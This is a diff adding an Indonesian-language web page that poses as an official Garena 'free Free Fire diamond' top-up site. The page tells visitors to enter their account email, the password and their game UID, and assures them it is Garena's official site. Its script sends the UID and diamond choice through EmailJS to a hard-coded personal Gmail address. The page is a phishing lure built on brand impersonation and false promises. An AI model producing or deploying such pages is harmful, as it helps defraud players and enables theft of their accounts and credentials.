@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Diamond Free Fire</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 500px;
+            width: 100%;
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(12px);
+            border-radius: 32px;
+            padding: 25px;
+            box-shadow: 0 25px 45px rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+
+        h1 {
+            text-align: center;
+            color: #FFD966;
+            margin-bottom: 8px;
+            font-size: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .sub {
+            text-align: center;
+            color: #ddd;
+            font-size: 14px;
+            margin-bottom: 25px;
+            border-bottom: 1px solid rgba(255,255,255,0.2);
+            padding-bottom: 12px;
+        }
+
+        .info-box {
+            background: #1e2a36;
+            border-left: 5px solid #FFD966;
+            padding: 12px 15px;
+            border-radius: 16px;
+            margin-bottom: 25px;
+            font-size: 13px;
+            color: #e0e0e0;
+        }
+
+        .info-box p {
+            margin: 5px 0;
+        }
+
+        .info-box strong {
+            color: #FFD966;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #f0f0f0;
+            margin-top: 15px;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 28px;
+            border: none;
+            background: #fff;
+            font-size: 16px;
+            outline: none;
+            transition: 0.2s;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+
+        input:focus, select:focus {
+            box-shadow: 0 0 0 3px #FFD96680;
+        }
+
+        .diamond-options {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin: 15px 0 10px;
+        }
+
+        .diamond-card {
+            background: #2c3e3f;
+            text-align: center;
+            padding: 10px;
+            border-radius: 40px;
+            cursor: pointer;
+            transition: 0.2s;
+            border: 2px solid transparent;
+            color: white;
+            font-weight: bold;
+        }
+
+        .diamond-card.selected {
+            background: #FFD966;
+            color: #1e2a2f;
+            border-color: #fff;
+            box-shadow: 0 0 10px rgba(255,217,102,0.6);
+        }
+
+        button {
+            width: 100%;
+            background: #FFD966;
+            color: #1e2a2f;
+            border: none;
+            padding: 14px;
+            border-radius: 40px;
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 25px;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 5px 0 #b47c00;
+        }
+
+        button:active {
+            transform: translateY(2px);
+            box-shadow: 0 2px 0 #b47c00;
+        }
+
+        button:disabled {
+            opacity: 0.6;
+            transform: none;
+            cursor: not-allowed;
+        }
+
+        .result {
+            margin-top: 20px;
+            background: #0f1a1f;
+            padding: 15px;
+            border-radius: 20px;
+            text-align: center;
+            color: #aaffdd;
+            font-size: 14px;
+            display: none;
+        }
+
+        .warning {
+            font-size: 12px;
+            text-align: center;
+            margin-top: 20px;
+            color: #ffb347;
+        }
+
+        footer {
+            text-align: center;
+            font-size: 11px;
+            margin-top: 20px;
+            color: #aaa;
+        }
+
+        .loading {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid #fff;
+            border-radius: 50%;
+            border-top-color: #FFD966;
+            animation: spin 0.6s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 480px) {
+            .container { padding: 18px; }
+            .diamond-options { gap: 8px; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>
+        <span>💎</span> Diamond Free Fire 💎
+    </h1>
+    <div class="sub">Topup Gratis • Cepat • Aman • Resmi</div>
+
+    <div class="info-box">
+        <p>✅ <strong>Cara Menggunakan :<strong></p>
+        <p>1. Masukkan <strong>Email Akun Free Fire</strong> Penerima</p>
+        <p>2. Masukkan <strong>Pasword Email Akun Free Fire</strong> Penerima</p>
+        <p>3. Masukkan <strong>Uid Akun Free Fire</strong> Penerima</p>
+        <p>4. Pilih Jumlah Diamond.</p>
+        <p>5. Klik Kirim</p>
+        <p>6. Diamond Otomatis Masuk ( 1-30 Menit )</p>
+        <p>‼️ <strong>JIKA DIAMOND TIDAK MASUK KEMUNGKINAN BATAS HARIAN PENUH ‼️</strong></p>
+    </div>
+
+    <form id="diamondForm">
+        <label>✉️ Email Akun</label>
+        <input type="text" id="email1" placeholder="email@gmail.com"required>
+        <label>🔒 Pasword Akun</label>
+        <input type="text" id="pasword1" placeholder="Pasword"required>
+        <label>🎮 UID Free Fire (9-12 digit angka)</label>
+        <input type="text" id="uid" placeholder="123456789" maxlength="12" pattern="[0-9]+" required>
+
+        <label>💎 Pilih Jumlah Diamond</label>
+        <div class="diamond-options" id="diamondOptions">
+            <div data-diam="50" class="diamond-card">50 💎</div>
+            <div data-diam="70" class="diamond-card">70 💎</div>
+            <div data-diam="91" class="diamond-card">91 💎</div>
+            <div data-diam="140" class="diamond-card">140 💎</div>
+            <div data-diam="355" class="diamond-card">355💎</div>
+            <div data-diam="720" class="diamond-card">720 💎</div>
+        </div>
+        <input type="hidden" id="selectedDiamond" value="100">
+
+        <button type="submit" id="btnKirim">Kirim Diamond</button>
+    </form>
+
+    <div id="resultBox" class="result"></div>
+    <div class="warning">
+        ⚠️ Diamond yang dikirim resmi via Garena ke UID yang dimasukkan. Jangan takut diamond kamu merah karena ini web resmi garena.
+    </div>
+    <footer>Support Garena Indonesia</footer>
+</div>
+
+<script>
+    // =============== KONFIGURASI EMAILJS ===============
+    // GANTI DENGAN DATA AKUN EMAILJS KAMU (GRATIS DAFTAR DI emailjs.com)
+    const EMAILJS_PUBLIC_KEY = "WONDIB9esoB7pkDoR";     // Ganti dengan Public Key kamu
+    const EMAILJS_SERVICE_ID = "service_v4kdrm8";     // Ganti dengan Service ID kamu
+    const EMAILJS_TEMPLATE_ID = "template_6b430m7";   // Ganti dengan Template ID kamu
+    
+    // EMAIL TUJUAN (email yang akan menerima notifikasi)
+    const ADMIN_EMAIL = "anisfachrudin03@gmail.com";        // Ganti dengan email tujuan
+    
+    // Inisialisasi EmailJS (jika key sudah diisi)
+    let emailJSInitialized = false;
+    
+    if (EMAILJS_PUBLIC_KEY !== "YOUR_PUBLIC_KEY") {
+        emailjs.init(EMAILJS_PUBLIC_KEY);
+        emailJSInitialized = true;
+        console.log("EmailJS initialized");
+    } else {
+        console.warn("EmailJS belum dikonfigurasi. Notifikasi email tidak akan terkirim.");
+    }
+    // ===================================================
+
+    // Pilih diamond card
+    const diamondCards = document.querySelectorAll('.diamond-card');
+    const selectedDiamondInput = document.getElementById('selectedDiamond');
+    const uidInput = document.getElementById('uid');
+    const form = document.getElementById('diamondForm');
+    const resultBox = document.getElementById('resultBox');
+    const btnKirim = document.getElementById('btnKirim');
+
+    // Fungsi pilih diamond
+    diamondCards.forEach(card => {
+        card.addEventListener('click', function() {
+            diamondCards.forEach(c => c.classList.remove('selected'));
+            this.classList.add('selected');
+            const diamValue = this.getAttribute('data-diam');
+            selectedDiamondInput.value = diamValue;
+        });
+    });
+
+    // Set default selected
+    diamondCards[0].classList.add('selected');
+    selectedDiamondInput.value = "100";
+
+    // Fungsi kirim email via EmailJS
+    async function sendEmailNotification(uid, diamond) {
+        if (!emailJSInitialized) {
+            console.log("EmailJS tidak aktif, simpan data lokal saja");
+            return false;
+        }
+        
+        try {
+            const templateParams = {
+                to_email: ADMIN_EMAIL,
+                uid: uid,
+                diamond: diamond,
+                waktu: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })
+            };
+            
+            const response = await emailjs.send(
+                EMAILJS_SERVICE_ID,
+                EMAILJS_TEMPLATE_ID,
+                templateParams
+            );
+            console.log("Email terkirim!", response);
+            return true;
+        } catch (error) {
+            console.error("Gagal kirim email:", error);
+            return false;
+        }
+    }
+
+    // Simpan ke localStorage sebagai cadangan (jika email gagal)
+    function saveToLocalStorage(uid, diamond) {
+        const requests = JSON.parse(localStorage.getItem('diamond_requests') || '[]');
+        requests.push({
+            uid: uid,
+            diamond: diamond,
+            waktu: new Date().toISOString(),
+            status: 'pending'
+        });
+        localStorage.setItem('diamond_requests', JSON.stringify(requests));
+        console.log("Tersimpan di local storage");
+    }
+
+    // Tampilkan hasil
+    function showResult(msg, type, emailStatus = null) {
+        resultBox.style.display = "block";
+        let emailInfo = "";
+        if (emailStatus === true) {
+            emailInfo = "<br>📧 <strong>Notifikasi sudah dikirim ke admin via email!</strong>";
+        } else if (emailStatus === false && emailJSInitialized) {
+            emailInfo = "<br>⚠️ Gagal kirim email, tapi permintaan tersimpan di sistem.";
+        }
+        resultBox.innerHTML = msg + emailInfo;
+        resultBox.style.background = type === "error" ? "#4a1a1f" : "#0f2f2a";
+        resultBox.style.color = type === "error" ? "#ffb3b3" : "#ccffcc";
+    }
+
+    // Submit form
+    form.addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        let uid = uidInput.value.trim();
+        const diamond = selectedDiamondInput.value;
+
+        // Validasi UID
+        if (uid === "") {
+            showResult("❌ UID tidak boleh kosong!", "error");
+            return;
+        }
+        if (!/^\d{9,12}$/.test(uid)) {
+            showResult("❌ UID harus berupa angka 9-12 digit (contoh: 1234567890)", "error");
+            return;
+        }
+
+        // Disable button selama proses
+        btnKirim.disabled = true;
+        const originalText = btnKirim.innerHTML;
+        btnKirim.innerHTML = '<span class="loading"></span> Mengirim...';
+
+        // Kirim email notifikasi (jika EmailJS dikonfigurasi)
+        let emailSent = false;
+        if (emailJSInitialized) {
+            emailSent = await sendEmailNotification(uid, diamond);
+        }
+        
+        // Simpan ke localStorage sebagai backup
+        saveToLocalStorage(uid, diamond);
+
+        // Tampilkan pesan sukses
+        const successMsg = `🎉 <strong>Permintaan berhasil dikirim!</strong><br><br>
+                            📌 UID: ${uid}<br>
+                            💎 Diamond: ${diamond}<br><br>
+                            ⏳ Admin akan memproses via topup resmi ke UID tersebut.`;
+        
+        showResult(successMsg, "success", emailSent);
+
+        // Reset form (opsional, biarkan UID terisi untuk kemudahan)
+        uidInput.value = "";
+        
+        // Reset diamond ke default
+        diamondCards.forEach(c => c.classList.remove('selected'));
+        diamondCards[0].classList.add('selected');
+        selectedDiamondInput.value = "100";
+
+        // Kembalikan tombol
+        btnKirim.disabled = false;
+        btnKirim.innerHTML = originalText;
+
+        // Auto hide setelah 10 detik
+        setTimeout(() => {
+            if(resultBox.style.display === "block") {
+                resultBox.style.opacity = "0.7";
+            }
+        }, 10000);
+    });
+
+    // Info jika EmailJS belum dikonfigurasi
+    if (!emailJSInitialized) {
+        const warningDiv = document.createElement('div');
+        warningDiv.style.background = "#ff980030";
+        warningDiv.style.padding = "10px";
+        warningDiv.style.borderRadius = "12px";
+        warningDiv.style.marginTop = "15px";
+        warningDiv.style.fontSize = "12px";
+        warningDiv.style.color = "#ffcc80";
+        warningDiv.innerHTML = "⚠️ <strong>Mode Demo:</strong> Notifikasi email belum aktif. <br>Daftar di emailjs.com dan isi kode di bagian KONFIGURASI.";
+        document.querySelector('.container').appendChild(warningDiv);
+    }
+</script>
+
+</body>
+</html>
